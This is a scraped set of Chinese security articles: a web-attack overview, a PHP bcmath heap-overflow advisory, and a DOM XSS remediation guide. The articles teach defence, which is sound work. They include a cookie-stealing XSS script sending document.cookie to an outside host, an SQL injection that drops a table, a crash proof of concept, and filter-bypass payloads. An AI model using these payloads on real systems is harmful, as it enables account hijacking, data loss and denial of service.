graphs in UI.      ""title"":""Title of the Issue"",   &lt;--The title of the issue.     ""description"": ""This text here shall be reflected in theUI as description of the issue."",       &lt;-- The description of the issue, this is optional.     ""remediation"": ""The text here shall be reflected in theUI as the steps to remediate the issue"", &lt;-- The remediation of the issue, this is optional.      ""link"":""Any URL that has more resources about the issue."",  &lt;-- URL of the issue. This is optional     ""example_insecure"": ""Put the insecure version of the codesnippet for learning purpose."",  &lt;-- This is optional     ""example_secure"": ""Put the secure version of the codesnippet for learning purpose."",      &lt;-- This is optional     ""platform_version"": ""all"",    &lt;-- Leave it like that      ""enabled"":""true"",            &lt;-- Thisvalue enables or disables the rule during the scan. It can be either""true"" or ""false"".      ""logic"":""Explain the logic behind this rule for future updation orcustomization"",     &lt;-- This isoptional     ""signature"": ""base64encode(regexp)""    &lt;-- Write the Regular Expression of yourpattern and then base64encode it to put it here.    }  ]} 如果你想要更好地利用这个扫描器，并不仅仅将其作为一个正则匹配器，你可以写一个像这样的简单扫描插件，在这里整合脚本，并脚本加入规则插件列表中。我想，这对那些有着python基础的人是非常简单的。","2016-09-12 18:03:44","安全工具","基于Github的源码白盒扫描工具Raptor","http://nsoad.com/Security-tools/20160912/tools-383.html"
"5ccbfa9e4f2f0a0a7a69c09c","0x00 背景DOM-Based XSS是一种基于文档对象模型（Document Object Model，DOM)的Web前端漏洞，简单来说就是JavaScript代码缺陷造成的漏洞。与普通XSS不同的是，DOM XSS是在","silence","随着服务端脚本技术、组件技术等技术手段的成熟，基于web平台构建的应用信息系统成为了internet信息系统的主流，而且逐渐成为电信、金融、财税等关键领域公共信息系统的首选。其http协议网络数据流量占到整个internet tcp数据流量的70%左右，重要性无容置疑。目前，internet上部署运行着各种各样的web信息系统，这些系统的安全在很大程度上关系到整个internet的正常运转。近年来，由于web应用攻击方法的不断曝光和web应用重要性不断提高，对web信息系统的攻击事件数量大增。绝大多数web攻击事件的根源在于web信息系统中存在有安全漏洞。文章目录    一、主动攻击二、 被动攻击三、 其他攻击一、主动攻击主动攻击是指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击的，因此攻击者需要能够访问到这些资源。主动攻击模式里具有代表性的攻击是SQL注入攻击和OS命令注入攻击。a、SQL注入定义：通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串中，最终达到欺骗服务器执行恶意SQL命令的目的。EG： select * from student  where username=‘admin’;  drop table student-- and password=‘1’ or ‘1’=‘1’上述命令，where 语句永远成立，且在执行后会删除student表，这样执行后果很严重。如何防止SQL注入：不信任用户的输入；不使用动态拼接sql，可使用参数化的sql或直接使用存储过程进行数据查询存取；不使用管理员权限的数据库连接；对机密信息进行加密或hash掉密码和敏感信息；应用异常尽可能少在web提示，最好使用自定义信息对应用的异常信息进行包装；采用工具或网络平台检测是否存在SQL注入。b、OS命令注入定义：与SQL类似，但注入对象针对操作系统，即能够在服务器上执行任意命令。从Web应用中通过Shell来调用操作系统命令，如果在Shell调用时存在漏洞，就可以执行攻击者的非法OS命令，也就是说，可以通过OS注入攻击执行OS上安装的各种程序。如，发送咨询邮件来注入攻击。如何防止OS注入：不调用外部程序；过滤掉、；，[,],|,&lt;,&gt;,\之类的符号；设置用户的权限。二、 被动攻击被动攻击是指利用圈套策略执行攻击代码的攻击模式，在被动攻击的过程中，攻击者不直接对目标Web应用程序发起攻击，一般的攻击手法是设置陷阱让用户去触发，中招后的用户浏览器会把含有攻击代码的HTTP请求发送给作为攻击目标的Web应用，运行攻击代码。攻击者借助这个攻击代码为基础，可以窃取用户个人信息、篡改滥用用户信息等。该攻击模式连企业内网都同样会受到攻击。被动攻击中具有代表性的攻击是跨站脚本攻击和跨站点请求伪造、HTTP首部注入攻击。a、XSS跨站脚本攻击定义：XSS，Cross-Site Scripting，攻击者利用在网页中嵌入客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器中执行，从而达到攻击者的目的。例如，在URL中加入特定的script代码来获取登录者的个人登陆信息、对用户Cookies的窃取攻击（通过Js获取）。EG：（1） 反射型XSShttp://a.com/a.jsp?name=xss &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; 通过诱惑用户打开恶意链接，服务器将链接中a.jsp页面渲染成下面的html：Hello xss &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; 这时浏览器将会弹出提示框（2） 持久型XSShttp://a.com/a.jsp?name=xss &amp;lt;script src=http://b.com/b.js&amp;gt;&amp;lt;/script&amp;gt; 将恶意代码提交给服务器，并且存储在服务器端，用户打开链接后，会加载b.js，并执行b.js的代码，代码如下： var img = document.createElement(""img"");  img.src = ""http://b.com/log?"" + escape(document.cookie);  document.body.appendChild(img); 执行完上述代码后会向b.com请求一张图片。但实际上是将当前页面的cookies发到b.com的服务器上，这样就完成了窃取cookies的过程。如何防止XSS跨站脚本攻击：（原则是不相信用户输入的数据）将重要的cookies标记为http only，这样JavaScript中的document.cookie语句就不能获取到cookie了；只允许用户输入我们期望的数据，如年龄的textbox中只允许输入数字，其余过滤；对数据进行Html Encode处理，如&lt;转化为&amp;lt；、&amp;转化为&amp;amp；过滤或移除特殊的Html标签，如：script、iframe；过滤JavaScript事件的标签，如“onclick=”、“onfocus”等等。b、CSRF跨站请求伪造定义：CSRF，Cross-Site Request Forgery，是指攻击者通过伪装来自受信任用户的请求来利用受信任的站点，强制对已完成认证的用户进行非预期的个人信息或设定信息等某种状态更新，属于被动攻击。例如，利用已通过认证的用户权限更新设定信息、利用已通过认证的用户权限购买商品、利用已通过认证的用户权限在留言板上发表言论等。EG：如果abc.com网站设定用户登录后才可以删除博客，删除博客的请求地址如下：  GET  http://abc.com/blog/delete?id=1 当用户登录abc.com后，又打开了http://b.com/b.html，其中有下面的内容： &amp;lt;img src=""http://abc.com/blog/delete?id=1""/&amp;gt; 这时会以用户在abc.com的身份发送http://abc.com/blog/delete?id=1，删除对应博客。如何防止CSRF跨站请求攻击：在web站点，将持久化的授权（例如cookie或者http授权）切换为瞬时的授权方法（在每个form中提供隐藏field）；验证码，强化用户与应用的交互，但不是任何请求都加验证码；“双提交”cookie；使用Post代替Get；检查请求header中的referer也能帮助组织CSRF攻击，但服务器不是总能拿到referer，有些浏览器出于安全会隐私考虑会不发referer，所以也不常用； 在浏览其它站点前退出登录站点或者浏览结束后清理浏览器cookies；生成一个随机的token，在用户提交数据的同时提交这个token，服务器端对比后如果不正确，则拒绝执行操作。c、HTTP首部注入攻击定义：该攻击模式是指攻击者通过响应首部字段被插入换行、添加任意响应首部或主体的一种攻击，属于被动攻击模式。其向首部主体添加内容，也称为HTTP响应截断攻击。攻击模式：Web应用有时会将从外部接收到的数值，赋给响应首部字段Location和Set-Cookie。HTTP首部注入通过在某些响应首部字段需要处理输出值的时候，插入换行发动攻击。例如，设置任何Cookie信息（）、重定向至任意URL、显示任意的主体（HTTP响应截断攻击）等。如何防止HTTP首部注入攻击： – 过滤所有的response headers，除去header中出现的非法字符，尤其是CRLF。三、 其他攻击a、目录遍历漏洞定义：在程序中没有过滤用户输入的../和./之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。如何防止目录遍历漏洞：权限控制；对包含了恶意的符号或者空字节进行拒绝；使用绝对路径+参数控制访问目录，减小漏洞可能涉及的范围。b、参数篡改定义：在URL中的某些参数或由用户输入的网页形式领域，数据都在没有得到用户授权的情况下改变了。导致浏览器指向一个不是用户想去的链接、网页或网站。如何防止参数篡改：对所有参数值进行校验；根据session ID进行迁移，参数使用服务器端的值。c、会话劫持定义：在一次正常会话过程中，攻击者作为第三方参与到其中，他可以在正常数据包中插入恶意数据，也可以在双方的会话当进行监听，甚至可以是代替某一方主机接管会话。如何防止会话劫持：限制入网的连接；设置网络拒绝接收假冒本地地址从互联网上发来的数据包；加密，例如SSH。","2016-08-17 00:56:27","Web安全","浅谈攻击Web应用常见的技术手段","http://nsoad.com/Article/web/20160817/299.html"
"5ccbfaa84f2f0a0a7a69c09d","绿盟科技安全团队发现www.securityfocus.com 网站对PHP“bcmath.c”多个本地堆溢出漏洞做了更新，其中涉及到的CVE编号分别为：CVE-2016-4537和CVE-2016-4538。20","blackhold","绿盟科技安全团队发现www.securityfocus.com 网站对PHP“bcmath.c”多个本地堆溢出漏洞做了更新，其中涉及到的CVE编号分别为：CVE-2016-4537和CVE-2016-4538。2016年4月24日，NULL-LIFE团队的Fernando向PHP官方提交了PHP“bcmath.c”库中的本地堆溢出漏洞。具体地址如下：https://bugs.php.net/bug.php?id=720932016年4月25日，官方进行了代码修复。具体地址如下：https://github.com/php/php-src/commit/d650063a0457aec56364e4005a636dc6c401f9cd2016年8月18日，官方发布了修复漏洞后的最新版本。2016年9月9日，绿盟科技安全团队发现www.securityfocus.com 网站对PHP“bcmath.c”多个本地堆溢出漏洞做了更新，其中涉及到的CVE编号分别为：CVE-2016-4537和CVE-2016-4538。CVE-2016-4537漏洞存在于ext/bcmath/bcmath.c库中的bcpowmod函数中，攻击者可以在远程调用该函数的时候故意传入一个负整数参数，从而导致拒绝服务或者其他尚未明确的影响。CVE-2016-4538漏洞存在于ext/bcmath/bcmath.c库中的bcpowmod函数中，该函数在对特定数据结构做修改的时候未对相应变量进行校验，可以导致攻击者使用精心构造的代码实施拒绝服务攻击或者其他尚未明确的影响。影响的版本PHP版本 &lt; 5.5.35PHP版本 5.6.x &lt; 5.6.21PHP版本 7.x &lt; 7.0.6不受影响的版本PHP版本 &gt;= 5.5.35PHP版本 5.6.x &gt;= 5.6.21PHP版本 7.x &gt;= 7.0.6漏洞分析漏洞的成因是由于文件ext/bcmath/bcmath.c中的bcpowmod函数在接受参数时没有做准确的参数校验，当向参数scale传入一个负数时，有可能造成拒绝服务或者其他未明确的影响。造成此漏洞的函数是bcpowmod，其声明如下：该函数的作用是求幂取模，例如下面代码，功能是对x求y次幂，然后求mod的模。&lt;?&lt;a href=""http://blog.nsfocus.net/tag/php/"" title=""php"" target=""_blank""&gt;php&lt;/a&gt;$a = bcpowmod($x, $y, $mod);?&gt;&lt;?php$a = bcpowmod($x, $y, $mod);?&gt;第4个参数scale是一个可选参数，当前面参数有小数时，用于指定小数点之后要显示的位数。然而当scale传入的是负数时，可能造成堆溢出引发拒绝服务。下面是该漏洞的验证程序：&lt;?phpbcpowmod(1, ""A"", 128, -200);   // 造成堆溢出bcpowmod(1, 1.2, 1, 1);    // 后续再次调用此函数时，由于堆结构已被破坏，造成程序崩溃?&gt;程序崩溃时的调用堆栈如下：AddressSanitizer: heap-buffer-overflow on address 0xb3805f68 at pc 0x083fd271 bp 0xbf91e4d8 sp 0xbf91e4c8READ of size 1 at 0xb3805f68 thread T0#0 0x83fd270 in bc_divide /home/fmunozs/phpgit/php56/ext/bcmath/libbcmath/src/div.c:122#1 0x83fff96 in bc_raisemod /home/fmunozs/phpgit/php56/ext/bcmath/libbcmath/src/raisemod.c:69#2 0x83f9923 in zif_bcpowmod /home/fmunozs/phpgit/php56/ext/bcmath/bcmath.c:426#3 0x9a7c718 in zend_do_fcall_common_helper_SPEC /home/fmunozs/phpgit/php56/Zend/zend_vm_execute.h:558#4 0x9640316 in execute_ex /home/fmunozs/phpgit/php56/Zend/zend_vm_execute.h:363#5 0x9a6c9c8 in zend_execute /home/fmunozs/phpgit/php56/Zend/zend_vm_execute.h:388#6 0x9470b59 in zend_execute_scripts /home/fmunozs/phpgit/php56/Zend/zend.c:1341#7 0x91acc6b in php_execute_script /home/fmunozs/phpgit/php56/main/main.c:2613#8 0x9a8648a in do_cli /home/fmunozs/phpgit/php56/sapi/cli/php_cli.c:994#9 0x808a502 in main /home/fmunozs/phpgit/php56/sapi/cli/php_cli.c:1378#10 0xb6dbe645 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18645)#11 0x808aaba  (/home/fmunozs/phpgit/php56/sapi/cli/php+0x808aaba) AddressSanitizer: heap-buffer-overflow /home/fmunozs/phpgit/php56/ext/bcmath/libbcmath/src/div.c:122 bc_divideShadow bytes around the buggy address:  0x36700b90: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa  0x36700ba0: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa  0x36700bb0: fa fa fd fa fa fa 00 00 fa fa fd fa fa fa fd fa  0x36700bc0: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa  0x36700bd0: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa=&gt;0x36700be0: fa fa fd fa fa fa fd fa fa fa fd fa fa[fa]fd fa  0x36700bf0: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa  0x36700c00: fa fa 01 fa fa fa 01 fa fa fa 01 fa fa fa 00 06  0x36700c10: fa fa 00 03 fa fa 00 05 fa fa 00 06 fa fa 00 07  0x36700c20: fa fa 00 00 fa fa 00 07 fa fa 00 00 fa fa 00 05  0x36700c30: fa fa 00 07 fa fa 00 07 fa fa 00 00 fa fa 00 00 PHP官方对此漏洞的修复如下，在ext/bcmath/bcmath.c文件中引入了一个新的校验函数split_bc_num，并在bcpowmod函数中通过split_bc_num加强了对scale参数的校验。防护方案PHP已经发布了新版本修复了此漏洞，建议用户升级PHP到最新版本。官方下载地址如下：https://php.net/downloads使用绿盟科技的远程评估系统（RSAS）对系统进行安全评估。短期服务：绿盟科技工程师现场处理。确保第一时间消除网络内相关风险点，控制事件影响范围，提供事件分析报告。中期服务：提供 3-6个月的风险监控与巡检服务。根除风险，确保事件不复发。长期服务：基于行业业务风险解决方案（威胁情报+攻击溯源+专业安全服务）。","2016-09-12 20:37:29","Web安全","PHP本地堆溢出漏洞技术分析与防护方案","http://nsoad.com/Article/web/20160912/385.html"
"5ccbfaa84f2f0a0a7a69c09e","Google Chrome V8引擎3.20至4.2版本中存在远程代码执行漏洞，该漏洞是由于源代码中“observe_accept_invalid”异常类型被误写为“observe_invalid_accept&r","silence","0x00 背景DOM-Based XSS是一种基于文档对象模型（Document Object Model，DOM)的Web前端漏洞，简单来说就是JavaScript代码缺陷造成的漏洞。与普通XSS不同的是，DOM XSS是在浏览器的解析中改变页面DOM树，且恶意代码并不在返回页面源码中回显，这使我们无法通过特征匹配来检测DOM XSS，给自动化漏洞检测带来了挑战。在2012年，腾讯安全平台部就研发并使用了基于QTWebkit引擎的检测方案。 然而，由于Web前端语言灵活多变，各项业务代码复杂不一，加上部分前端开发人员安全意识不足，仍源源不断有存在JavaScript缺陷的页面产生，使得DOM XSS的检测出现了不少“漏网之鱼”。更加雪上加霜的是，由于JavaScript是一门客户端脚本语言，其代码逻辑可以被任意用户查看到，所以不少“治标不治本”的DOM XSS对抗策略被攻击者再次绕过，刚爬出一个坑，又跌落另一个坑。 DOM XSS就像行人在广场随地乱吐的口香糖，成了Web前端挥之不去的安全梦魇。被随手编写出来容易，查找和修复却反反复复，费时费力。无论是目前安全平台部研发的门神系统，还是DOM XSS安全JS，都只能称作缓兵之计。若能在开发过程中，有针对性的留意容易造成DOM XSS的JavaScript代码多留一个心眼，对传入的数据做严格的过滤，将其限制在可控范围内，才有可能从根本上解决DOM XSS。毕竟所有漏洞的终极良药就是安全的开发意识和规范。驱散前端安全梦魇，保护用户安全，需要从开发到运维的多方面共同努力。 本文将首先讲解DOM XSS不可小觑的危害，接着总结高发DOM XSS的业务场景，给出缺陷代码实例，并详述漏洞产生原因，最后分类给出有效彻底的防护过滤手段。 0x01 不可小觑的DOM-XSS比漏洞本身更具危害的是：掉以轻心。 一般情况下，XSS给人最深的印象似乎就是弹不完的浏览器提示框，除了恼人外，似乎无关痛痒： 但就算是小小的一个反射型DOM XSS，如果落到黑产手中，也会被利用的“淋漓尽致”，让成千上万的用户带来损失。以邮箱业务下的DOM XSS为例，通过该漏洞，黑产能够偷取到邮箱用户的cookie。借助这个“令牌”，攻击者就能够自由出入用户的邮箱，收发用户的私密邮件。至此，一方面攻击者能够劫持中招用户继续扩散恶意邮件，偷取更多邮箱用户的“令牌”，进而控制更多的邮箱；另一方面，黑产可以获取用户邮箱中的敏感信息，进而重置邮箱用户在其他网站注册的账户密码。试想，在如今生活方方面面离不开互联网的今天，如果一位用户将邮箱账户同时绑定了Apple iCloud账户，网盘账户，金融支付账户，邮箱的沦陷将带来多大的“雪崩式”效应。 你以为这就是全部了？如果DOM XSS如果出现在了客户端产品的“特权域”，危害将会被进一步升级。首先向大家来解释一下什么是“特权域”。特权域是部分客户端产品，因为要实现WEB和客户端产品的交互，比如在网页内点击链接自动安装一个浏览器插件，自动向手机推送一条消息。但同时出于安全考虑，又不能让所有WEB域都调用这些具有“特权”的接口，因此基于“白名单”思想，客户端开发工程师设下了“结界”，限制了类似只有如“*.qq.com”域名下将能够调用“结界”内的API接口。因为一般来讲，借助“白名单”思路，API的调用是十分可控的。但如果这些特权域下出现了DOM-XSS，攻击者可以通过引入外部恶意JS，让自己瞬间具备了调用特权API的权限，至此，工程师设下的“结界”被捅破严重的情况下，甚至可以导致客户端产品的远程代码执行。 0x02 DOM XSS典型场景分析与修复指南一、 在前端实现页面跳转 在很多场景下，业务需要实现页面跳转，常见的实现方式一般有三种，第一种是设在后端设置302跳转Header或通过函数接收参数实现跳转，第二种是使用Meta标签实现跳转，最后一种是通过JavaScript实现跳转。不少Web前端工程师对最后一种跳转的方式情有独钟，最常用到的方法有: location.href / location.replace() / location.assign()。 也许提到页面跳转业务场景下的安全问题，你首先会想到限制不严导致任意URL跳转，而DOM XSS与此似乎“八竿子打不着”。但有一种神奇的东西叫“伪协议”，比如：“javascript:”、“vbscript:”、“data:”、“tencent:”、“mobileqqapi:”等，其中“javascript:”、“vbscript:”、“data:”在浏览器下可以执行脚本： (图：使用“javascript:”伪协议在页面内执行脚本) 最为要命的是，使用这些伪协议执行的JavaScript代码的上下文（context）就是当前页面，也就相当于在页面内注入了一段恶意JavaScript代码。至此，攻击者也就能实施0x01中提到的攻击了。 经过前几年DOM XSS狂轰滥炸式的洗礼，Web前端工程处理起相关跳转代码逻辑来，也个个都是有经验的老司机了。直接从各种来源取跳转目标URL，然后通过上面提到的三个JavaScript实现跳转的方式，已销声匿迹。 你以为这样就结束了？这个世界上，还有一种比老司机更厉害的生物，那就是“老老司机”——时刻虎视眈眈查找业务漏洞的攻击者们。之前提到，由于JavaScript是一种客户端脚本语言，如果说Web后端代码有一层“窗户纸”护着的话，那位于Web前端的JavaScript代码就时时刻刻“天窗大开”和访客“坦诚相见”。所以，以下若干种过滤对抗手段，一下子就会眼尖的攻击者绕过，并继续大摇大摆的构造攻击： 常见缺陷1：使用indexOf判断URL参数是否合法 示例缺陷代码： avaScript相关规范中指出，indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置。该方法将从头到尾地检索字符串 stringObject，看它是否含有子串 searchvalue。 也就是说，如果传入的URL中带有indexOf的关键词，那indexOf方法将直接返回true。拿上面的缺陷代码为例，只要攻击传入的URL中带有tmast://，indexOf将直接返回true，并进入跳转逻辑。所以攻击者只要构造”javascript:alert(1);//tmast://”即可完成攻击，又因为“tmast://”位于JavaScript代码的注释部分，所以JavaScript代码运行时会直接忽略，但indexOf却认为URL中存在“tmast://”直接放行。 常见缺陷2：正则表达式缺陷 示例缺陷代码 [1]： 示例缺陷代码 [2]： 聪明的Web前端工程狮，当然知道indexOf下潜藏的“深坑”，所以祭出了神器“正则表达式”。但不曾想“阴沟翻船”，有对URL进行了严格限制的意识，比如跳转页面只能是qq.com/paipai.com，认为这样就可以解决DOM-XSS和URL跳转的问题，但忘了一个神奇的符号“^”，加上和不加上，过滤的效果具有天壤之别。因为正则没有严格限制传入的URL开头只能是“http”或“https”，攻击者仍然可以构造“javascript:alert(1);//http://www.qq.com”来绕过看似严格的过滤。 修复技巧 在前端实现页面跳转业务场景下，正确的过滤实现方法是，严格限制跳转范围。一方面要限制能够跳转页面的协议：只能是http、https或是其他指可控协议；另一方面，要严格限制跳转的范围，如果业务只要跳转到指定的几个页面，可以直接从数组中取值判断是否这几个页面，如果跳转范围稍大，正确使用正则表达式将跳转URL严格限制到可控范围内。 二、 取值写入页面或动态执行 除接收URL参数经后端处理最后在前端展示外，在Web前端通过JavaScript获取不同来源的参数值，不经后端处理即刻在Web页面进行展示或动态执行的业务场景也十分常见，虽然通过此方法，优化了用户的浏览体验，但也带来了满满的安全风险。 想要在客户端实现接受参数并写入页面或动态执行，就不得不用到JavaScript“三姐妹”，她们分别是：innerHTML、document.write、eval。“三姐妹”具有强大的功能的同时，不经意间也成了DOM-XSS攻击的导火索。因为JavaScript取值的来源纷繁复杂，如：Parameter、Cookies、Referer、Window name、SessionStorage等，工程师稍有不慎忘记做转义处理，或过分相信取值来源的数据，直接将分离出的参数值交给JavaScript“三姐妹”处理，就有可能招来DOM-XSS。接下来，将按不同数据源，详述每种业务场景下易造成DOM-XSS的代码缺陷。 常见缺陷1：从URL中的取参数值写入页面或动态执行 示例缺陷代码[1]： 粗心的工程狮直接从URL的锚参数（即位于#后面的参数）中取值，不经过任何处理直接innerHTML写入页面，导致攻击者只需要构造如下URL即可完成一次DOM XSS攻击： 由于整个攻击过程在客户端侧完成，不需要向服务器发送任何请求数据，所以即便业务接入了对抗反射型XSS的Web应用防火墙（WAF），这类DOM XSS也无法被感知，攻击者便可畅通无阻的利用漏洞对用户开展攻击。 示例缺陷代码[2]: 当然，不只是innerHTML一种方法，只要传入的参数值没有做任何处理，并进入到JavaScript“三姐妹”类似的函数中，就会产生DOM XSS漏洞。就比如在此案例下，页面内引入了jQuery库，JavaScript的initUI函数直接将获取到的未经过滤的name参数，通过“$().html()”的方式写入了页面，进而可以被攻击者利用，进行基于DOM XSS漏洞的攻击。 常见缺陷2：从Cookie中的取参数值写入页面或动态执行 示例缺陷代码[1]: 示例缺陷代码 [2]： 依据相关规范，在浏览器中不同域下的Cookie有隔离措施，即在google.com下是不能向qq.com下设置cookie的，可以说cookie这个来源相对来说较为可靠。但万事总是不是绝对的，由于过分相信cookie这个来源，除了直接从cookie中取值作为判断用户身份的依据造成任意用户账户登录的的高危逻辑缺陷外，不安全的cookie操作方式也产生了大量的DOM-XSS。 示例缺陷代码[1]，直接从cookie中取值写入页面或动态执行，原理基本同从URL中的取参数值写入页面或动态执行，只是换了一个取值来源而已，相信各位已经有了大概了解。但同时我们注意到，还有一种较为特殊的业务场景，示例缺陷代码[2]：取cookie键值，动态拼接要页面引入前端资源的URL。在此场景下，工程师已经对HTML常见的特殊字符做了过滤，是不是就安全了呢？并不。一般情况下，进行转义的HTML的特殊字符如下： 在上面这个案例中，如果window.isp取到的值为“www.attacker.com/”，最终拼接出来的静态资源URL路径为：http://www.attacker.com/victim.com，因为“.”和“/”都不在转义范围内，导致攻击者可以向页面引入自己站点下的恶意js文件，进而实施DOM-XSS攻击。 常见缺陷3：从localStorage、Referer、Window name、SessionStorage中的取参数值写入页面或动态执行 示例缺陷代码： 从localStorage、Referer、Window name、SessionStorage数据源中取数据，也时常是栽跟头的高发地。上面这段示例代码中，就首先取window.name的值，最后直接innerHTML到页面中。一般情况下，页面的window.name攻击者不可控，故往往会被认为来源相对可信。但借助iframe的name属性，攻击者可以将页面的window.name设置为攻击代码，仍然可以 通过下面这段Payload，构造DOM XSS： 修复技巧 1. 写入页面前先转义。在取值写入页面或动态执行的业务场景下，在将各种来源获取到的参数值传入JavaScript“三姐妹”函数（innerHTML、document.write、eval）处理前，对传入数据中的HTML特殊字符进行转义处理能防止大部分DOM-XSS的产生。此外，根据不同业务的真实情况，还应使用正则表达式，针对传入的数据做更严格的过滤限制，才能保证万无一失。 2. 慎用危险的“eval”。需要强调的是，由于JavaScript中的eval函数十分灵活，能够支持执行的字符串编码纷繁复杂。强烈建议，不到万不得已，不要使用eval函数处理不可控的外部数据。 3. 编写安全的函数方法，从看似“可靠”的数据源获取参数值。无论是从cookie，还是从localStorage、Referer、Window name、SessionStorage中获取数据，都应使用安全的函数，对传入的数据做过滤后，再传递给相关函数写入页面或执行。 三、 使用HTML5 postMessage进行跨域通讯 示例缺陷代码： HTML5引入的postMessage()方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本档、多窗口、跨域消息传递。其本意是方便Web前端开发者实现跨域通讯，由于浏览器遵循同源策略（Same Origin Policy），所以如下跨域向页面写入内容的操作将会被阻断： 但借助postMessage()方法，Web前端开发者就能实现跨域从site-a.net向site-b.net下页面写入内容。然而，开发者享受便利的同时，也却往往疏忽大意，忘记对postMessage的来源event.origin进行限制，导致任意域名下的页面只要通过如下代码，就可以与存在缺陷的页面进行跨域交互通讯，也再次落入DOM XSS的深坑： 修复技巧： 修复此类漏洞的方法简单直接，只要在页面进行innerHTML操作前做一次even.origin的判断。当然，在innerHTML前，将event.data的数据进行一次HTML特殊字符转义，将会锦上添花，确保万无一失。 四、使用存在缺陷的第三方库或通用组件 常见缺陷：jQuery低版本（1.9.0以下）存在DOM XSS漏洞可导致用户身份被盗用 （参考：http://bugs.jquery.com/ticket/9521） (图：漏洞利用代码传入$()函数执行可触发漏洞) jQuery 是一个非常流行的JavaScript 库，但低版本的jQeury存在设计缺陷，导致引入低版本的jQuery文件之后，若对用户传入的参数值没有进行处理即传入$()函数中执行，且参数值中存在html标签，即$(‘〈 img src=x onerror=alert()〉‘)，jQuery会自动生成该html标签并加载在页面中，可导致DOM XSS漏洞。 0x03 DOM XSS通用解决方案 一、参考/使用filter.js库 filter.js由一系列针对常见业务场景下造成DOM XSS的恶意数据开展过滤的函数组成。其中包括：VaildURL、HtmlEncode、HtmlAttributeEncode等函数方法。在使用过程中，针对上面一部分提到的不同的场景需要，使用与之对应的过滤函数进行验证，才可以从根本上防止DOM XSS产生。 (图: aq_common.js实现原理及防御效果) 举个例子，当业务需要在前端实现页面跳转时，根据之前提到的修复策略，就应使用VaildURL方法对跳转目标做一次过滤验证。 当然在使用filter.js之前，需要根据业务真实情况，对其中部分JavaScript函数做修改，比如上面这个校验跳转目标网址的函数，就应根据自身需要基于正则表达式做相关扩充或更严格的限制。 二、Web前端应用防护方案 门神DOM-XSS防御JS是腾讯安全平台部为解决XSS问题提出的一套Web前端应用防护方案，与运行在后端的门神WAF是“亲兄弟”。但相较于传统WAF，门神DOM XSS防御JS通过JavaScript代码实现，所以能在客户端持续生效，可以缓解DOM XSS漏洞带来的危害。 (图: 门神DOM-XSS防御JS实现原理及防御效果) 在参考/使用filter.js库的同时，也不妨参考门神DOM XSS防御JS，给站点多加一层“防护罩”。不过需要提示的是，类似门神DOM XSS防御JS这样的Web前端应用防护，仅能提高常见DOM XSS攻击的门槛，并不能从源头上修复并解决XSS。所以要根除DOM XSS还需要从存在缺陷的代码入手，对获取的参数值做严格过滤限制，才能真正治本。 三、定期进行漏洞检测 在业务上线前后，使用漏洞扫描系统，定期进行漏洞检测有助于及时发现和处理JavaScript代码中的缺陷。 腾讯云的客户可以使用自带的“云安全 QS”，很方便地进行定期漏洞检测。访问“https://console.qcloud.com/host/defect/exam”，在如下界面添加要扫描的站点即可： (图: 腾讯云“主机与网站安全”网站漏洞检测系统) 0x04 写在最后用一句话来总结所有DOM XSS的场景，就是：不可控的危险数据，未经过滤被传入存在缺陷的JavaScript代码处理，最终触发DOM XSS漏洞。而在制定防护DOM XSS漏洞方案时，应首先树立起“安全的开发意识和规范”，从存在缺陷的代码入手，从源头解决DOM XSS，最后辅之以Web前端应用相关防护措施。 在防御和消灭DOM XSS漏洞的斗争一线，希望Web前端工程师们树立起安全的开发意识，与广大运维安全人员携手，将DOM XSS漏洞消灭在萌芽之中。驱散前端安全梦魇，保护用户安全。 0x05 参考资料 1. [腾讯安全应急响应中心] 基于QtWebKit的DOM XSS检测技术 https://security.tencent.com/index.php/blog/msg/12 2. [Hewlett Packard] XSS and App Security through HTML5's PostMessage() http://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002#.V7FTFk196Ul","2016-08-17 01:00:17","Web安全","驱散前端安全梦魇——DOMXSS典型场景分析与修复指南","http://nsoad.com/Article/web/20160817/300.html"
"5ccbfaa84f2f0a0a7a69c09f","随着Scrapy等框架的流行，用Python等语言写爬虫已然成为一种时尚。但是今天，我们并不谈如何写爬虫，而是说说不要写代码就能写出来的爬虫。","blackhold","随着Scrapy等框架的流行，用Python等语言写爬虫已然成为一种时尚。但是今天，我们并不谈如何写爬虫，而是说说不要写代码就能写出来的爬虫。爬虫新时代在早期互联网世界，写爬虫是一项技术含量非常高的活，往大的方向说，爬虫技术是搜索引擎的重要组成部分。随着互联网技术的发展，写爬虫不再是门槛非常高的技术了，一些编程语言甚至直接提供爬虫框架，例如python的Scrapy框架，它们让写爬虫走入“寻常百姓家”。在知乎的热门话题“能利用爬虫技术做到哪些很酷很有趣很有用的事情？”下，很多用户用爬虫实现了很多有趣的事情：    有人用爬虫爬取了12万知乎用户的头像，并根据点击数据训练出来了一个机器人，可以自动识别美女；    有人用爬虫爬取了上海各大房产网站的数据，分析并总结出过去几年上海房价的深度报告；    有人用爬虫爬取了一千多万用户的400亿条tweet，对twitter进行数据挖掘。写爬虫几乎没有门槛我们已经发现，写爬虫是一件炫酷的事情。但即使是这样，学习爬虫仍然有一定的技术门槛，比如说要使用Scrapy框架，你至少得会python编程语言。想象一个场景:你是一个房地产销售人员，你需要联系很多潜在客户，这时候如果靠在搜索引擎或者在相关网页上查看信息，就会非常地费时费力。于是就有朋友说了，学习一下怎么写爬虫，然后抓取销售数据就可以了，一次学习终生受用。这样的说法，很难说的上是个好主意，对于房地产销售从业者来说，学习写爬虫的代价实在是过于高昂了，一来没有编程基础，二来如果真的能写好爬虫，恐怕就直接转行写带代码了。在这样的形势下，一些可视化的爬虫工具诞生了！这些工具通过一些策略来爬取特定的数据， 